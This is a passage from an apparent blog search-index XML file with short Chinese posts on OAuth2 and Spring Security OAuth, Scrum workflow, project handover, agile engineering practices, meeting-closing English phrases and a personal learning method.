          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OAuth2 架构设计</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/OAuth2/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/OAuth2/</url>
      
        <content type="html"><![CDATA[<h2 id="OAuth2-背景"><a href="#OAuth2-背景" class="headerlink" title="OAuth2 背景"></a>OAuth2 背景</h2><p>OAuth（Open Authorization，开放授权）是为用户资源的授权定义了一个安全、开放及简单的标准，第三方无需知道用户的账号及密码（只是其中一种授权方式），就可获取到用户的授权信息<br>OAuth2.0是OAuth协议的延续版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。</p><p>OAuth 可以让不同的资源服务器使用同一个鉴权服务器,常见应用场景为第三方授权，以及给自己的 APP 或者 SPA 应用提供鉴权服务。</p><p>OAuth 的网站 <a href="https://oauth.net/2/" target="_blank" rel="noopener">https://oauth.net/2/</a> </p><p>OAuth 可以在一台服务器上完成，也可以分布式的在多台服务器上完成。</p><h2 id="使用-Spring-Security-OAuth"><a href="#使用-Spring-Security-OAuth" class="headerlink" title="使用 Spring Security OAuth"></a>使用 Spring Security OAuth</h2><p>Spring Security OAuth 体系中，依照 OAuth2 的规范有三个角色</p><ul><li>Provider 授权提供者，负责签发token</li><li>Authorization Server 授权验证服务器，负责验证token</li><li>Resource Service 资源服务器，资源提供者同时验证是否有权限访问</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>敏捷开发的基本流程</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/agile-basic-work-flow/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/agile-basic-work-flow/</url>
      
        <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>敏捷开发流程中的一些很好的工作方式，本文中使用的敏捷方法为 Scrum</p><h2 id="建卡"><a href="#建卡" class="headerlink" title="建卡"></a>建卡</h2><p>BA 负责建 story 卡，如果其他人需要建立卡片，需要告知 BA</p><h2 id="需求澄清（three-amigos）"><a href="#需求澄清（three-amigos）" class="headerlink" title="需求澄清（three amigos）"></a>需求澄清（three amigos）</h2><p>BA DEV QA 三方 catchup ，澄清卡的需求，然后 BA 移动到当前迭代</p><h2 id="工作量估算（estimation）"><a href="#工作量估算（estimation）" class="headerlink" title="工作量估算（estimation）"></a>工作量估算（estimation）</h2><p>BA 发起全员来进行估算工作量，并澄清需求</p><p>估点数量按照斐波那契数列例如 1 2 3 5，超过 5 个点的卡需要被拆分</p><h2 id="移动任务到待开发-（ready-for-dev）"><a href="#移动任务到待开发-（ready-for-dev）" class="headerlink" title="移动任务到待开发 （ready for dev）"></a>移动任务到待开发 （ready for dev）</h2><p>BA 把卡移动到 ready for dev，然后开发就可以开始工作</p><h2 id="开发中-（development）"><a href="#开发中-（development）" class="headerlink" title="开发中 （development）"></a>开发中 （development）</h2><p>Dev 需要和 BA、QA 领卡，kick off 然后开始工作，每个卡需要建立一个branch，完成工作后需要检查 pipeline 是否通过然后，创建 Pull request，然后该卡可以移动到 review</p><h2 id="审查-（Review）"><a href="#审查-（Review）" class="headerlink" title="审查 （Review）"></a>审查 （Review）</h2><p>Review 环节需要找人 approve PR</p><h2 id="移动任务到待测试-（Ready-for-test）"><a href="#移动任务到待测试-（Ready-for-test）" class="headerlink" title="移动任务到待测试 （Ready for test）"></a>移动任务到待测试 （Ready for test）</h2><p>合并代码到 master，和 QA sign off 后移动故事卡到 Ready for test</p>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>项目移交检查清单</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/wa-of-working-for-handover/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/wa-of-working-for-handover/</url>
      
        <content type="html"><![CDATA[<h4 id="What-we-can-do-fo-that"><a href="#What-we-can-do-fo-that" class="headerlink" title="What we can do fo that?"></a>What we can do fo that?</h4><ul><li>整理一个清单</li><li>建立一个文档去跟踪</li><li>安排一些conversation去移交</li><li>review 那些东西已经被确认接受</li><li>角色对角色, QA、DEV、BA分别处理</li><li>定义移交scope</li><li>定义deadline</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个敏捷项目需要的相关技术实践</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/ecosystem-for-project/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/ecosystem-for-project/</url>
      
        <content type="html"><![CDATA[<p>一个项目可以做的很完善,也可以做的很简单,这篇文章就是总结了一个清单,来讨论我们在一个敏捷项目中可以做的比较完善的东西,比如CI/CD</p><h2 id="质量内建"><a href="#质量内建" class="headerlink" title="质量内建"></a>质量内建</h2><ol><li>Check style - 代码风格检查</li><li>Test coverage - 测试覆盖率</li><li>fortify - Java代码静态分析</li><li>TDD - 测试驱动开发</li><li>Eslint - 前端代码检查</li></ol><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><ol><li>Penetration - 渗透测试</li></ol><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ol><li>CI/CD 持续部署</li><li>Git Flow - 基于git的团队协作方式</li><li>Retro - 敏捷中反思项目的会议</li></ol><h2 id="监控恢复"><a href="#监控恢复" class="headerlink" title="监控恢复"></a>监控恢复</h2><ol><li>monitoring<ul><li>Ahportal - 一种监控的实现方式</li></ul></li><li>DR - 灾难恢复方案</li></ol><h2 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h2><ol><li>CPU、内存、磁盘使用率</li><li>Max request量</li><li>AB 测试</li></ol><h2 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h2><ol><li>infrastructure as code - 根据项目代码创建基础设施</li><li>immutable infrastructure - 每次部署创建新的服务器</li><li>DB migration</li></ol><h2 id="分布式解耦"><a href="#分布式解耦" class="headerlink" title="分布式解耦"></a>分布式解耦</h2><ol><li>micro-service 微服务</li><li>SPA Project - 前后端分离</li></ol><h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><ol><li>Blue-Green - 蓝绿部署</li><li>Gray - 灰度发布</li></ol>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>How to end a meeting?</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-wrap-up/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/how-to-wrap-up/</url>
      
        <content type="html"><![CDATA[<h2 id="some-of-usages"><a href="#some-of-usages" class="headerlink" title="some of usages"></a>some of usages</h2><ul><li>“any questions”</li><li>“any comments”</li><li>“any other updates”</li></ul><h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><ul><li>“Today we have covered”</li><li>“in this meeting we have discussed”</li><li>“The main points that I’d like to sum up are”</li><li>“To summarize today’s meeting”</li><li>“Let me summarize what we have talked about today before we finish”</li></ul><h2 id="重点单词"><a href="#重点单词" class="headerlink" title="重点单词"></a>重点单词</h2><ul><li>Sum up 口语上的summarize</li><li>Recap 复盘，重述</li></ul><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>express the time run out of time</p><ul><li>it seems as though we’ve run out of time for today</li><li>Unfortunately we are out of time </li></ul><p>express to close a meeting </p><ul><li>Let’s call a day</li><li>Let’s wrap up</li><li>that’s all for our meeting</li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我的学习方法</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-leaning-method/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-leaning-method/</url>
      
        <content type="html"><![CDATA[<h2 id="知识的分类"><a href="#知识的分类" class="headerlink" title="知识的分类"></a>知识的分类</h2><ol><li>一类是基本的知识和技能，例如算法、数据结构、英语</li><li>一类是开源技术的说明书，例如 spring cloud，需要学习使用方法、注意事项、原理</li></ol><h2 id="基础知识和技能的学习方法"><a href="#基础知识和技能的学习方法" class="headerlink" title="基础知识和技能的学习方法"></a>基础知识和技能的学习方法</h2><ol><li>识别是否有前置知识，先学习前置知识</li><li>获取相对较好的学习材料：书籍、在线课程</li><li>模仿式学习，例如做习题、通过分屏敲代码</li><li>实践</li><li>写作输出</li><li>形成培训输出</li></ol><h2 id="开源技术的学习方法"><a href="#开源技术的学习方法" class="headerlink" title="开源技术的学习方法"></a>开源技术的学习方法</h2><ol><li>回答几个问题<ul><li>这项技术是什么？</li><li>这项技术的意义？</li><li>这项技术的定位？</li><li>为什么需要学习这项技术?</li><li>这项技术学习完成带来的收益是什么？</li></ul></li><li>收集入门教程，模仿式学习</li><li>阅读入门教程产出笔记或者思维导图</li><li>使用小项目练习</li><li>阅读官方文档了解更多</li><li>搞懂原理（可选）</li></ol><h2 id="学习一门新技能的要点"><a href="#学习一门新技能的要点" class="headerlink" title="学习一门新技能的要点"></a>学习一门新技能的要点</h2><ul><li>咨询有经验的人，需要提前准备问题，寻求一些好的资料和书籍</li><li>阅读速度不宜过快，安排大块时间。step by step</li><li>碎片化时间不可取，碎片化时间可以用于写作输出、练习，模仿式学习阶段不应该使用碎片化时间</li><li>一定要有产出</li><li>编写文档到知识系统中</li><li>知识应该随时花大量时间学习，甚至考证作为里程碑，说明书按照项目需要学习，平时只做了解即可</li><li>写作要在培训前面，否则没有沉淀无法输出培训</li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
